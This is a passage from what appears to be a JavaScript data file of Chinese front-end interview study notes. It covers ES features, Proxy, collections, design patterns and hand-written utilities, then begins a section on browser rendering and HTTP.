| 循环引用 | 可处理（获取已加载的部分） | 可处理（通过引用处理） |
| 使用环境 | Node.js | 浏览器 + Node.js |
| Tree Shaking | 不支持 | 支持 |

### 6.4 循环引用问题

**CommonJS 的循环引用**：

\`\`\`javascript
// a.js
console.log('a 开始加载');
exports.done = false;
const b = require('./b.js');
console.log('在 a 中, b.done =', b.done);
exports.done = true;
console.log('a 加载完毕');

// b.js
console.log('b 开始加载');
exports.done = false;
const a = require('./a.js');
console.log('在 b 中, a.done =', a.done); // false（此时 a 还没执行完）
exports.done = true;
console.log('b 加载完毕');

// main.js
const a = require('./a.js');
const b = require('./b.js');
console.log('a.done =', a.done); // true
console.log('b.done =', b.done); // true
\`\`\`

**ES Module 的循环引用**：

\`\`\`javascript
// a.mjs
import { b } from './b.mjs';
console.log('a:', b);
export const a = 'a';

// b.mjs
import { a } from './a.mjs';
console.log('b:', a); // undefined（因为 a 还没初始化完成）
export const b = 'b';
\`\`\`

---

## 七、Generator 与 Iterator

### 7.1 Iterator（迭代器）

Iterator 是一种接口，为各种数据结构提供统一的访问机制。

\`\`\`javascript
// 手写 Iterator
function createIterator(array) {
  let index = 0;
  return {
    next: function() {
      if (index < array.length) {
        return { value: array[index++], done: false };
      }
      return { value: undefined, done: true };
    }
  };
}

const iterator = createIterator([1, 2, 3]);
console.log(iterator.next()); // { value: 1, done: false }
console.log(iterator.next()); // { value: 2, done: false }
console.log(iterator.next()); // { value: 3, done: false }
console.log(iterator.next()); // { value: undefined, done: true }
\`\`\`

**可迭代对象（Iterable）**：实现了 \`[Symbol.iterator]\` 方法的对象。

\`\`\`javascript
// 自定义可迭代对象
const range = {
  from: 1,
  to: 5,

  [Symbol.iterator]() {
    let current = this.from;
    const last = this.to;

    return {
      next() {
        if (current <= last) {
          return { value: current++, done: false };
        }
        return { value: undefined, done: true };
      }
    };
  }
};

for (const num of range) {
  console.log(num); // 1, 2, 3, 4, 5
}

console.log([...range]); // [1, 2, 3, 4, 5]
\`\`\`

### 7.2 Generator（生成器）

Generator 是 ES6 引入的一种特殊函数，可以暂停执行和恢复执行。

\`\`\`javascript
function* generatorFunction() {
  console.log('开始执行');
  yield 1;
  console.log('暂停后恢复');
  yield 2;
  console.log('再次暂停后恢复');
  yield 3;
  console.log('执行完毕');
  return 'done';
}

const gen = generatorFunction();

console.log(gen.next()); // 开始执行 → { value: 1, done: false }
console.log(gen.next()); // 暂停后恢复 → { value: 2, done: false }
console.log(gen.next()); // 再次暂停后恢复 → { value: 3, done: false }
console.log(gen.next()); // 执行完毕 → { value: 'done', done: true }
\`\`\`

### 7.3 Generator 的应用

**1. 异步流程控制**：

\`\`\`javascript
function* fetchUser() {
  const user = yield fetch('/api/user');
  console.log('用户:', user);
  const posts = yield fetch(\`/api/posts?userId=\${user.id}\`);
  console.log('文章:', posts);
  return posts;
}

// 自动执行器
function run(generator) {
  const gen = generator();

  function handle(result) {
    if (result.done) return Promise.resolve(result.value);

    return Promise.resolve(result.value).then(res => {
      return handle(gen.next(res));
    });
  }

  return handle(gen.next());
}

run(fetchUser).then(posts => {
  console.log('最终结果:', posts);
});
\`\`\`

**2. 实现可迭代对象**：

\`\`\`javascript
const range = {
  from: 1,
  to: 5,

  *[Symbol.iterator]() {
    for (let i = this.from; i <= this.to; i++) {
      yield i;
    }
  }
};

console.log([...range]); // [1, 2, 3, 4, 5]
\`\`\`

**3. 状态机**：

\`\`\`javascript
function* trafficLight() {
  while (true) {
    yield '红灯';
    yield '绿灯';
    yield '黄灯';
  }
}

const light = trafficLight();
console.log(light.next().value); // 红灯
console.log(light.next().value); // 绿灯
console.log(light.next().value); // 黄灯
console.log(light.next().value); // 红灯
\`\`\`

---

## 八、Proxy 与 Reflect

### 8.1 Proxy

Proxy 可以拦截对目标对象的操作，创建代理对象。

\`\`\`javascript
const target = {
  name: '张三',
  age: 25
};

const handler = {
  // 拦截读取操作
  get(target, property, receiver) {
    console.log(\`读取属性: \${property}\`);
    if (property in target) {
      return Reflect.get(target, property, receiver);
    }
    return \`属性 \${property} 不存在\`;
  },

  // 拦截设置操作
  set(target, property, value, receiver) {
    console.log(\`设置属性: \${property} = \${value}\`);
    if (property === 'age') {
      if (typeof value !== 'number' || value < 0 || value > 150) {
        throw new Error('年龄无效');
      }
    }
    return Reflect.set(target, property, value, receiver);
  },

  // 拦截删除操作
  deleteProperty(target, property) {
    console.log(\`删除属性: \${property}\`);
    if (property === 'name') {
      throw new Error('不能删除 name 属性');
    }
    return Reflect.deleteProperty(target, property);
  },

  // 拦截 in 操作符
  has(target, property) {
    console.log(\`检查属性: \${property}\`);
    return Reflect.has(target, property);
  },

  // 拦截 Object.keys
  ownKeys(target) {
    console.log('获取所有键');
    return Reflect.ownKeys(target);
  }
};

const proxy = new Proxy(target, handler);

console.log(proxy.name);   // 读取属性: name → "张三"
console.log(proxy.gender); // 读取属性: gender → "属性 gender 不存在"
proxy.age = 30;            // 设置属性: age = 30
// proxy.age = -1;         // 抛出错误：年龄无效
// delete proxy.name;      // 抛出错误：不能删除 name 属性
console.log('name' in proxy); // 检查属性: name → true
console.log(Object.keys(proxy)); // 获取所有键 → ["name", "age"]
\`\`\`

### 8.2 Proxy 的拦截器（13 种）

| 拦截器 | 对应操作 |
|--------|---------|
| get | 读取属性 |
| set | 设置属性 |
| has | in 操作符 |
| deleteProperty | delete 操作符 |
| ownKeys | Object.keys/for...in |
| getOwnPropertyDescriptor | Object.getOwnPropertyDescriptor |
| defineProperty | Object.defineProperty |
| preventExtensions | Object.preventExtensions |
| getPrototypeOf | Object.getPrototypeOf |
| setPrototypeOf | Object.setPrototypeOf |
| isExtensible | Object.isExtensible |
| apply | 函数调用 |
| construct | new 操作符 |

### 8.3 Proxy 的应用场景

**1. 数据验证**：

\`\`\`javascript
function createValidator(schema) {
  return new Proxy({}, {
    set(target, key, value) {
      const validator = schema[key];
      if (validator && !validator(value)) {
        throw new Error(\`\${key} 验证失败\`);
      }
      target[key] = value;
      return true;
    }
  });
}

const user = createValidator({
  name: v => typeof v === 'string' && v.length > 0,
  age: v => Number.isInteger(v) && v > 0 && v < 150,
  email: v => /^[^\s@]+@[^\s@]+\.[^\s@]+\$/.test(v)
});

user.name = '张三';
user.age = 25;
user.email = 'zhangsan@example.com';
// user.age = -1; // Error: age 验证失败
\`\`\`

**2. 响应式数据（Vue 3 原理）**：

\`\`\`javascript
function reactive(target) {
  return new Proxy(target, {
    get(target, key, receiver) {
      console.log(\`读取: \${String(key)}\`);
      const result = Reflect.get(target, key, receiver);
      // 依赖收集
      track(target, key);
      // 嵌套对象也转为响应式
      if (result !== null && typeof result === 'object') {
        return reactive(result);
      }
      return result;
    },
    set(target, key, value, receiver) {
      console.log(\`设置: \${String(key)} = \${value}\`);
      const oldValue = target[key];
      const result = Reflect.set(target, key, value, receiver);
      if (oldValue !== value) {
        // 触发更新
        trigger(target, key);
      }
      return result;
    }
  });
}

const state = reactive({ count: 0, user: { name: '张三' } });
state.count++; // 设置: count = 1
console.log(state.user.name); // 读取: user → 读取: name → "张三"
\`\`\`

**3. 日志记录**：

\`\`\`javascript
function withLogging(obj) {
  return new Proxy(obj, {
    get(target, key) {
      const value = target[key];
      if (typeof value === 'function') {
        return function(...args) {
          console.log(\`调用方法 \${String(key)}，参数:\`, args);
          const result = value.apply(this, args);
          console.log(\`方法 \${String(key)} 返回:\`, result);
          return result;
        };
      }
      return value;
    }
  });
}

const math = withLogging({
  add(a, b) { return a + b; },
  multiply(a, b) { return a * b; }
});

math.add(1, 2); // 调用方法 add，参数: [1, 2] → 方法 add 返回: 3
\`\`\`

### 8.4 Reflect

Reflect 是一个内置对象，提供拦截 JavaScript 操作的方法。它的方法与 Proxy 的拦截器一一对应。

\`\`\`javascript
// Reflect 的常用方法
const obj = { name: '张三', age: 25 };

// 读取属性
Reflect.get(obj, 'name'); // "张三"

// 设置属性
Reflect.set(obj, 'age', 30); // true

// 判断属性是否存在
Reflect.has(obj, 'name'); // true

// 删除属性
Reflect.deleteProperty(obj, 'age'); // true

// 获取所有键
Reflect.ownKeys(obj); // ["name"]

// 等同于 new 操作符
function Person(name) { this.name = name; }
Reflect.construct(Person, ['张三']); // Person { name: '张三' }

// 等同于函数调用
function greet(msg) { return msg + ', ' + this.name; }
Reflect.apply(greet, { name: '张三' }, ['Hello']); // "Hello, 张三"
\`\`\`

**Reflect vs 直接操作**：
- Reflect 方法有返回值（成功返回 true，失败返回 false），而直接操作可能抛出异常
- Reflect 让函数式编程成为可能
- Reflect 与 Proxy 的拦截器一一对应，在 Proxy 中配合使用

---

## 九、Set、Map、WeakMap、WeakSet

### 9.1 Set

Set 是值的集合，每个值只能出现一次。

\`\`\`javascript
const set = new Set([1, 2, 3, 3, 4]);
console.log(set); // Set { 1, 2, 3, 4 }

// 常用方法
set.add(5);             // 添加
set.delete(2);          // 删除
set.has(3);             // 是否存在
set.size;               // 大小
set.clear();            // 清空

// 遍历
set.forEach(value => console.log(value));
for (const value of set) {
  console.log(value);
}

// 数组去重
const arr = [1, 2, 2, 3, 3, 4];
const unique = [...new Set(arr)]; // [1, 2, 3, 4]

// 交集、并集、差集
const a = new Set([1, 2, 3]);
const b = new Set([2, 3, 4]);

const union = new Set([...a, ...b]);                    // 并集: {1, 2, 3, 4}
const intersection = new Set([...a].filter(x => b.has(x))); // 交集: {2, 3}
const difference = new Set([...a].filter(x => !b.has(x)));  // 差集: {1}
\`\`\`

### 9.2 Map

Map 是键值对的集合，键可以是任意类型（Object 的键只能是字符串或 Symbol）。

\`\`\`javascript
const map = new Map();

// 设置键值对
map.set('name', '张三');
map.set(1, '数字键');
map.set({}, '对象键');

// 常用方法
map.get('name');        // "张三"
map.has('name');        // true
map.delete('name');     // 删除
map.size;               // 大小
map.clear();            // 清空

// 遍历
map.forEach((value, key) => {
  console.log(key, value);
});

for (const [key, value] of map) {
  console.log(key, value);
}

// Map vs Object
// 1. Map 的键可以是任意类型
// 2. Map 保持插入顺序
// 3. Map 有 size 属性
// 4. Map 在频繁增删键值对时性能更好
// 5. Map 是可迭代的
\`\`\`

### 9.3 WeakMap 和 WeakSet

**WeakMap**：键必须是对象，且键是弱引用（不阻止垃圾回收）。

\`\`\`javascript
const weakMap = new WeakMap();
let obj = { id: 1 };

weakMap.set(obj, 'data');
weakMap.get(obj); // "data"
weakMap.has(obj); // true

obj = null; // obj 可以被垃圾回收，weakMap 中的对应条目也会被清除

// 适用场景：存储 DOM 元素的额外数据
const elementData = new WeakMap();
elementData.set(document.getElementById('app'), { clicks: 0 });
\`\`\`

**WeakSet**：成员必须是对象，且是弱引用。

\`\`\`javascript
const weakSet = new WeakSet();
let obj = { id: 1 };

weakSet.add(obj);
weakSet.has(obj); // true

obj = null; // obj 可以被垃圾回收

// 适用场景：标记对象
const visited = new WeakSet();
function visit(obj) {
  if (visited.has(obj)) return;
  visited.add(obj);
  // 处理 obj
}
\`\`\`

**WeakMap/WeakSet 特点**：
- 不可迭代（没有 keys/values/entries 方法）
- 没有 size 属性
- 键/成员是弱引用，有助于垃圾回收
- 主要用于关联数据和跟踪对象

---

## 十、数组方法

### 10.1 reduce

\`\`\`javascript
// 基础用法
const sum = [1, 2, 3, 4].reduce((acc, cur) => acc + cur, 0); // 10

// 数组扁平化
const flatten = (arr) => arr.reduce(
  (acc, cur) => acc.concat(Array.isArray(cur) ? flatten(cur) : cur),
  []
);

// 统计元素出现次数
const count = ['a', 'b', 'a', 'c', 'b', 'a'].reduce((acc, cur) => {
  acc[cur] = (acc[cur] || 0) + 1;
  return acc;
}, {});
// { a: 3, b: 2, c: 1 }

// 按属性分组
const people = [
  { name: '张三', age: 25 },
  { name: '李四', age: 30 },
  { name: '王五', age: 25 }
];
const grouped = people.reduce((acc, person) => {
  const key = person.age;
  if (!acc[key]) acc[key] = [];
  acc[key].push(person);
  return acc;
}, {});

// 实现 map
const myMap = (arr, fn) => arr.reduce((acc, cur) => {
  acc.push(fn(cur));
  return acc;
}, []);

// 实现 filter
const myFilter = (arr, fn) => arr.reduce((acc, cur) => {
  if (fn(cur)) acc.push(cur);
  return acc;
}, []);

// 实现 compose（函数组合）
const compose = (...fns) => fns.reduce((f, g) => (...args) => f(g(...args)));
\`\`\`

### 10.2 flat 和 flatMap

\`\`\`javascript
// flat：数组扁平化
const arr = [1, [2, [3, [4]]]];

arr.flat();        // [1, 2, [3, [4]]] — 默认扁平 1 层
arr.flat(2);       // [1, 2, 3, [4]] — 扁平 2 层
arr.flat(Infinity); // [1, 2, 3, 4] — 完全扁平

// 手写 flat
function myFlat(arr, depth = 1) {
  if (depth < 1) return arr.slice();

  return arr.reduce((acc, cur) => {
    return acc.concat(Array.isArray(cur) ? myFlat(cur, depth - 1) : cur);
  }, []);
}

// flatMap：先 map 再 flat（只能扁平 1 层）
const result = [1, 2, 3].flatMap(x => [x, x * 2]);
// [1, 2, 2, 4, 3, 6]

// 等同于
[1, 2, 3].map(x => [x, x * 2]).flat();
\`\`\`

### 10.3 其他常用数组方法

\`\`\`javascript
// find：找到第一个满足条件的元素
const found = [1, 5, 10, 15].find(x => x > 8); // 10

// findIndex：找到第一个满足条件的元素索引
const index = [1, 5, 10, 15].findIndex(x => x > 8); // 2

// every：所有元素都满足条件
[1, 2, 3].every(x => x > 0); // true

// some：至少一个元素满足条件
[1, 2, 3].some(x => x > 2); // true

// includes：是否包含某个值
[1, 2, 3].includes(2); // true

// fill：填充数组
Array(5).fill(0); // [0, 0, 0, 0, 0]

// from：从类数组创建数组
Array.from('hello'); // ['h', 'e', 'l', 'l', 'o']
Array.from({ length: 5 }, (_, i) => i); // [0, 1, 2, 3, 4]

// of：从参数创建数组
Array.of(1, 2, 3); // [1, 2, 3]
\`\`\`

---

## 十一、JavaScript 设计模式

### 11.1 单例模式

单例模式确保一个类只有一个实例，并提供全局访问点。

\`\`\`javascript
// ES6 类实现
class Singleton {
  static instance = null;

  constructor() {
    if (Singleton.instance) {
      return Singleton.instance;
    }
    this.data = [];
    Singleton.instance = this;
  }

  add(item) {
    this.data.push(item);
  }

  getData() {
    return this.data;
  }
}

const s1 = new Singleton();
const s2 = new Singleton();
console.log(s1 === s2); // true

// 闭包实现
const Singleton = (function() {
  let instance = null;

  function createInstance() {
    return {
      data: [],
      add(item) { this.data.push(item); },
      getData() { return this.data; }
    };
  }

  return {
    getInstance: function() {
      if (!instance) {
        instance = createInstance();
      }
      return instance;
    }
  };
})();
\`\`\`

### 11.2 观察者模式（发布-订阅模式）

观察者模式定义了对象间的一对多依赖关系，当一个对象状态改变时，所有依赖它的对象都会收到通知。

\`\`\`javascript
class EventEmitter {
  constructor() {
    this.events = {};
  }

  // 订阅事件
  on(event, callback) {
    if (!this.events[event]) {
      this.events[event] = [];
    }
    this.events[event].push(callback);
    return this; // 链式调用
  }

  // 取消订阅
  off(event, callback) {
    if (!this.events[event]) return this;
    this.events[event] = this.events[event].filter(cb => cb !== callback);
    return this;
  }

  // 只订阅一次
  once(event, callback) {
    const wrapper = (...args) => {
      callback.apply(this, args);
      this.off(event, wrapper);
    };
    this.on(event, wrapper);
    return this;
  }

  // 发布事件
  emit(event, ...args) {
    if (!this.events[event]) return this;
    this.events[event].forEach(callback => {
      callback.apply(this, args);
    });
    return this;
  }
}

// 使用
const emitter = new EventEmitter();
emitter.on('click', (data) => console.log('点击了:', data));
emitter.emit('click', { x: 10, y: 20 }); // 点击了: { x: 10, y: 20 }
\`\`\`

### 11.3 工厂模式

工厂模式提供创建对象的接口，将对象的创建和使用分离。

\`\`\`javascript
// 简单工厂
class User {
  constructor(name, role) {
    this.name = name;
    this.role = role;
  }
}

class UserFactory {
  static createAdmin(name) {
    return new User(name, 'admin');
  }

  static createEditor(name) {
    return new User(name, 'editor');
  }

  static createViewer(name) {
    return new User(name, 'viewer');
  }
}

const admin = UserFactory.createAdmin('张三');
const editor = UserFactory.createEditor('李四');

// 工厂方法模式
class Button {
  render() { return '<button>按钮</button>'; }
}

class LinkButton extends Button {
  render() { return '<a href="#" class="button">链接按钮</a>'; }
}

class IconButton extends Button {
  render() { return '<button><i class="icon"></i>图标按钮</button>'; }
}

class ButtonFactory {
  createButton(type) {
    switch (type) {
      case 'link': return new LinkButton();
      case 'icon': return new IconButton();
      default: return new Button();
    }
  }
}
\`\`\`

### 11.4 策略模式

策略模式定义一系列算法，把它们封装起来，并且使它们可以相互替换。

\`\`\`javascript
// 表单验证策略
const strategies = {
  isNonEmpty: function(value, errorMsg) {
    if (value.trim() === '') return errorMsg;
  },
  minLength: function(value, length, errorMsg) {
    if (value.length < length) return errorMsg;
  },
  isMobile: function(value, errorMsg) {
    if (!/^1[3-9]\d{9}\$/.test(value)) return errorMsg;
  },
  isEmail: function(value, errorMsg) {
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+\$/.test(value)) return errorMsg;
  }
};

class Validator {
  constructor() {
    this.rules = [];
  }

  add(value, rules) {
    rules.forEach(rule => {
      const strategyArr = rule.strategy.split(':');
      this.rules.push(() => {
        const strategy = strategyArr.shift();
        strategyArr.unshift(value);
        strategyArr.push(rule.errorMsg);
        return strategies[strategy].apply(null, strategyArr);
      });
    });
  }

  start() {
    for (const validatorFunc of this.rules) {
      const errorMsg = validatorFunc();
      if (errorMsg) return errorMsg;
    }
  }
}

// 使用
const validator = new Validator();
validator.add('', [
  { strategy: 'isNonEmpty', errorMsg: '用户名不能为空' },
  { strategy: 'minLength:6', errorMsg: '用户名不能少于6位' }
]);
console.log(validator.start()); // "用户名不能为空"
\`\`\`

---

## 十二、常见进阶面试题

### 面试题 1：手写深拷贝

参见第一节的手写深拷贝代码。

### 面试题 2：手写防抖和节流

参见第二节的防抖和节流实现。

### 面试题 3：手写 call、apply、bind

\`\`\`javascript
// 手写 call
Function.prototype.myCall = function(context, ...args) {
  context = context || window;
  const fnSymbol = Symbol('fn');
  context[fnSymbol] = this;
  const result = context[fnSymbol](...args);
  delete context[fnSymbol];
  return result;
};

// 手写 apply
Function.prototype.myApply = function(context, args) {
  context = context || window;
  const fnSymbol = Symbol('fn');
  context[fnSymbol] = this;
  const result = context[fnSymbol](...(args || []));
  delete context[fnSymbol];
  return result;
};

// 手写 bind
Function.prototype.myBind = function(context, ...args1) {
  const fn = this;
  return function(...args2) {
    return fn.apply(
      this instanceof fn ? this : context,
      [...args1, ...args2]
    );
  };
};
\`\`\`

### 面试题 4：手写 new 操作符

\`\`\`javascript
function myNew(constructor, ...args) {
  // 1. 创建一个空对象，原型指向构造函数的 prototype
  const obj = Object.create(constructor.prototype);
  // 2. 执行构造函数，绑定 this
  const result = constructor.apply(obj, args);
  // 3. 如果构造函数返回对象，则返回该对象，否则返回新对象
  return result instanceof Object ? result : obj;
}

function Person(name) {
  this.name = name;
}
const p = myNew(Person, '张三');
console.log(p.name); // "张三"
console.log(p instanceof Person); // true
\`\`\`

### 面试题 5：手写 instanceof

\`\`\`javascript
function myInstanceof(obj, constructor) {
  let proto = Object.getPrototypeOf(obj);
  while (proto) {
    if (proto === constructor.prototype) return true;
    proto = Object.getPrototypeOf(proto);
  }
  return false;
}
\`\`\`

### 面试题 6：实现一个 EventEmitter

参见观察者模式部分的代码实现。

### 面试题 7：手写数组扁平化

\`\`\`javascript
// 递归实现
function flatten(arr) {
  return arr.reduce((acc, cur) => {
    return acc.concat(Array.isArray(cur) ? flatten(cur) : cur);
  }, []);
}

// 迭代实现
function flatten(arr) {
  const result = [];
  const stack = [...arr];

  while (stack.length) {
    const item = stack.pop();
    if (Array.isArray(item)) {
      stack.push(...item);
    } else {
      result.unshift(item);
    }
  }

  return result;
}
\`\`\`

---

## 总结

JavaScript 进阶考点考察的是候选人对语言特性的深入理解和实际应用能力。深拷贝、防抖节流、柯里化、事件委托、模块系统、Proxy、设计模式等不仅是面试高频题，也是日常开发中经常用到的技术。掌握这些进阶技能，是区分初级和高级前端工程师的关键。

**核心记忆点**：
1. 深拷贝需要用 WeakMap 处理循环引用，支持 Date、RegExp、Map、Set
2. 防抖是"最后一次有效"，节流是"固定频率执行"
3. 柯里化是参数复用，配合闭包使用
4. 事件委托减少内存占用，支持动态元素
5. ES Module 支持 Tree Shaking，是未来的趋势
6. Proxy 有 13 种拦截器，Vue 3 的响应式基于 Proxy
7. WeakMap/WeakSet 的弱引用特性有助于防止内存泄漏
`
  },
  {
    id: "fe-browser",
    group: "基础能力",
    icon: "🌐",
    title: "浏览器原理与网络面试题",
    content: `

# 浏览器原理与网络面试题

## 一、浏览器渲染流程

### 1.1 渲染流水线总览

浏览器从接收到 HTML 文件到渲染出完整页面，经历了以下六个关键步骤：

\`\`\`
1. 解析 HTML → 构建 DOM 树
2. 解析 CSS → 构建 CSSOM 树
3. 合并 DOM 和 CSSOM → 构建渲染树（Render Tree）
4. 布局（Layout）→ 计算每个节点的几何位置
5. 绘制（Paint）→ 将节点绘制到图层
6. 合成（Composite）→ 将各图层合并为最终图像
\`\`\`

### 1.2 DOM 树构建详解

浏览器从网络或缓存中获取 HTML 字节数据后：

1. **字节 → 字符**：根据编码（如 UTF-8）将字节转换为字符
2. **字符 → Token**：词法分析器将字符流解析为 Token（开始标签、结束标签、文本等）
3. **Token → 节点**：语法分析器将 Token 转换为 DOM 节点对象
4. **节点 → DOM 树**：根据嵌套关系构建树结构

**DOM 树构建是增量式的**：浏览器不需要等待整个 HTML 下载完成，可以边下载边解析。

### 1.3 CSSOM 树构建

CSSOM 的构建过程与 DOM 类似，但需要注意：

- **CSS 的阻塞特性**：CSS 不阻塞 DOM 解析，但会阻塞渲染。CSSOM 构建完成之前，浏览器不会渲染任何内容
- **CSS 的级联特性**：CSSOM 树需要计算所有样式规则的优先级，确定每个节点的最终样式
- **浏览器默认样式**：每个浏览器都有默认样式表（User Agent Stylesheet），这是 CSSOM 的一部分

### 1.4 渲染树（Render Tree）构建

渲染树是 DOM 树和 CSSOM 树的合并，只包含**需要渲染的可见节点**：

| 是否在渲染树中 | 条件 |
|-------------|------|
| 在 | 可见的 DOM 节点（如 div、p、span 等） |
| 不在 | display: none 的元素 |
| 不在 | head、script、meta 等不可见标签 |
| 在但不可见 | visibility: hidden 的元素（占据空间但不可见） |

### 1.5 布局（Layout / Reflow）

布局阶段计算每个渲染树节点的**精确位置和大小**。

布局是一个递归过程：
1. 从根渲染器（对应 html 元素）开始
2. 遍历渲染树，计算每个渲染器的几何信息
3. 所有相对测量值都转换为屏幕上的绝对像素

**全局布局和增量布局**：
- 全局布局：影响整个渲染树（如窗口大小改变、字体大小改变）
- 增量布局：只影响部分渲染树（如新增 DOM 元素）

### 1.6 绘制（Paint）

绘制阶段将渲染树中的每个节点转换为屏幕上的实际像素。

绘制顺序（从后到前）：
1. 背景色（background-color）
2. 背景图（background-image）
3. 边框（border）
4. 子节点
5. 轮廓（outline）

### 1.7 合成（Composite）

浏览器会将页面分成多个图层（Layer），每个图层独立绘制，最后由合成线程将各图层合并。

**会创建独立图层的条件**：
- 根元素
- position: fixed
- 3D transform（translateZ 等）
- video、canvas 元素
- CSS 动画和过渡（opacity、transform）
- will-change 属性
- 有合成层后代且自身有层叠上下文

**合成的好处**：图层变化时只需要重新合成，不需要重新布局和绘制，性能最优。

---

## 二、回流（Reflow）与重绘（Repaint）

### 2.1 什么是回流

回流（Reflow）是指当元素的**几何属性**（位置、大小）发生变化时，浏览器需要重新计算布局的过程。

**回流的代价**：回流一定会触发重绘，而且会影响到渲染树中的其他节点（父节点、子节点、兄弟节点）。

### 2.2 什么是重绘

重绘（Repaint）是指当元素的外观（颜色、背景、可见性等）发生变化，但不影响布局时，浏览器重新绘制元素的过程。

**重绘的代价**：重绘不涉及布局计算，但涉及像素绘制，成本低于回流。

### 2.3 触发回流的操作

**一定会触发回流的操作**：
- 修改元素的 width、height、margin、padding、border
- 修改元素的 position、top、left、right、bottom
- 修改字体大小
- 修改 display 属性
- 浏览器窗口大小变化（resize）
- 添加/删除 DOM 元素
- 激活 CSS 伪类（如 :hover 中修改了布局属性）

**可能触发回流的操作**（读取以下属性时，浏览器会强制刷新布局队列）：
- offsetTop、offsetLeft、offsetWidth、offsetHeight
- scrollTop、scrollLeft、scrollWidth、scrollHeight
- clientTop、clientLeft、clientWidth、clientHeight
- getComputedStyle()
- getBoundingClientRect()

### 2.4 回流和重绘的优化策略

**1. 批量修改 DOM**：

\`\`\`javascript
// 低效：逐个修改 DOM
const list = document.getElementById('list');
for (let i = 0; i < 100; i++) {
  const li = document.createElement('li');
  li.textContent = \`Item \${i}\`;
  list.appendChild(li); // 每次 append 都可能触发回流
}

// 高效：使用 DocumentFragment 批量操作
const fragment = document.createDocumentFragment();
for (let i = 0; i < 100; i++) {
  const li = document.createElement('li');
  li.textContent = \`Item \${i}\`;
  fragment.appendChild(li);
}
list.appendChild(fragment); // 只触发一次回流
\`\`\`

**2. 使用 CSS class 代替逐个修改样式**：

\`\`\`javascript
// 低效：逐个修改 style
element.style.width = '100px';
element.style.height = '100px';
element.style.margin = '10px';
element.style.padding = '5px';

// 高效：使用 class
element.className = 'new-style';
\`\`\`

**3. 缓存布局信息**：

\`\`\`javascript
// 低效：多次读取布局属性
for (let i = 0; i < 100; i++) {
  element.style.left = element.offsetLeft + 1 + 'px';
}

// 高效：缓存读取的值
let left = element.offsetLeft;
for (let i = 0; i < 100; i++) {
  left += 1;
  element.style.left = left + 'px';
}
\`\`\`

**4. 使用 display: none 离线操作**：

\`\`\`javascript
// 先隐藏元素，修改完再显示
element.style.display = 'none';
// 大量 DOM 操作...
element.style.width = '100px';
element.style.height = '100px';
element.appendChild(childNode);
element.style.display = 'block'; // 只在最后触发一次回流
\`\`\`

**5. 使用 transform 代替 top/left 做动画**：

\`\`\`css
/* 触发回流 */
.animate {
  transition: left 0.3s;
  left: 100px;
}

/* 不触发回流（只触发合成） */
.animate {
  transition: transform 0.3s;
  transform: translateX(100px);
}
\`\`\`

---

## 三、浏览器多进程架构

### 3.1 浏览器的主要进程

| 进程 | 职责 |
|------|------|
| 浏览器进程（Browser Process） | 地址栏、书签、前进/后退、网络请求、文件访问 |
| GPU 进程 | 3D 绘制、页面合成 |
| 网络进程 | 网络资源加载 |
| 插件进程 | 管理浏览器插件（如 Flash） |
| 渲染进程（Renderer Process） | 标签页内的页面渲染（每个标签页一个） |
| 存储进程 | 管理 localStorage、IndexedDB 等 |

### 3.2 渲染进程的多线程

每个渲染进程（标签页）内部包含多个线程：

| 线程 | 职责 |
|------|------|
| GUI 渲染线程 | 解析 HTML/CSS、构建渲染树、布局、绘制 |
| JS 引擎线程 | 解析和执行 JavaScript |
| 事件触发线程 | 管理事件循环，控制事件队列 |
| 定时器线程 | 管理 setTimeout 和 setInterval |
| 异步 HTTP 请求线程 | 处理 XMLHttpRequest 等异步请求 |

**重要**：GUI 渲染线程和 JS 引擎线程是**互斥**的。当 JS 引擎执行时，GUI 渲染线程会被冻结。这就是为什么长时间执行的 JS 会导致页面卡顿。

### 3.3 为什么每个标签页一个渲染进程

- **安全性**：沙箱隔离，一个页面的崩溃不影响其他页面
- **稳定性**：某个标签页的内存泄漏不会影响其他标签页
- **性能**：可以并行处理多个标签页的渲染

### 3.4 站点隔离（Site Isolation）

Chrome 的站点隔离策略确保不同站点的页面使用不同的渲染进程，即使它们在同一个标签页中（如 iframe）。

---

## 四、HTTP 协议

### 4.1 HTTP/1.0

特点：
- 每次请求都需要建立新的 TCP 连接
- 缺点：TCP 连接建立和关闭的开销很大

### 4.2 HTTP/1.1

**核心改进**：

| 特性 | 说明 |
|------|------|
| 持久连接（Keep-Alive） | TCP 连接可复用，减少连接开销 |
| 管道化（Pipelining） | 可同时发送多个请求，但响应必须按顺序返回 |
| Host 头 | 支持虚拟主机（一台服务器托管多个域名） |
| 断点续传 | Range 头支持部分内容请求 |
| 缓存控制 | Cache-Control、ETag 等头部 |

**HTTP/1.1 的问题**：
- **队头阻塞（Head-of-Line Blocking）**：管道化要求响应按顺序返回，前面的慢响应会阻塞后面的
- **并发限制**：浏览器对同一域名限制 6-8 个并发连接
- **头部冗余**：每次请求都携带大量重复的头部信息（如 Cookie）

### 4.3 HTTP/2

**核心改进**：

| 特性 | 说明 |
|------|------|
| 二进制分帧 | 不再使用文本传输，而是二进制帧 |
| 多路复用（Multiplexing） | 同一连接上可以同时发送多个请求和响应，互不阻塞 |
| 头部压缩（HPACK） | 使用哈夫曼编码压缩头部，减少冗余 |
| 服务器推送（Server Push） | 服务器可以主动推送客户端可能需要的资源 |
| 流优先级 | 可以设置请求的优先级，优化资源加载顺序 |

**HTTP/2 的问题**：
- 仍然基于 TCP，TCP 层面的队头阻塞依然存在
- 丢包重传时，TCP 的拥塞控制会影响所有流

### 4.4 HTTP/3（QUIC）

HTTP/3 基于 QUIC 协议（Quick UDP Internet Connections），使用 UDP 而非 TCP。

**核心改进**：

| 特性 | 说明 |
|------|------|
| 0-RTT 连接 | 首次连接 1-RTT，后续连接 0-RTT |
| 无队头阻塞 | 基于 UDP，单个流的丢包不影响其他流 |
| 连接迁移 | 网络切换时不需要重新建立连接（基于连接 ID 而非 IP） |
| 内置 TLS 1.3 | 加密是 QUIC 的必需部分 |

### 4.5 HTTP 状态码

| 状态码 | 含义 | 说明 |
|--------|------|------|
| 200 | OK | 请求成功 |
| 201 | Created | 资源创建成功 |
| 204 | No Content | 请求成功，但无返回内容 |
| 301 | Moved Permanently | 永久重定向 |
| 302 | Found | 临时重定向 |
| 304 | Not Modified | 资源未修改，使用缓存 |
| 307 | Temporary Redirect | 临时重定向（保持请求方法） |
| 308 | Permanent Redirect | 永久重定向（保持请求方法） |
| 400 | Bad Request | 请求参数错误 |
| 401 | Unauthorized | 未认证 |
| 403 | Forbidden | 无权限 |
| 404 | Not Found | 资源不存在 |
| 405 | Method Not Allowed | 请求方法不允许 |
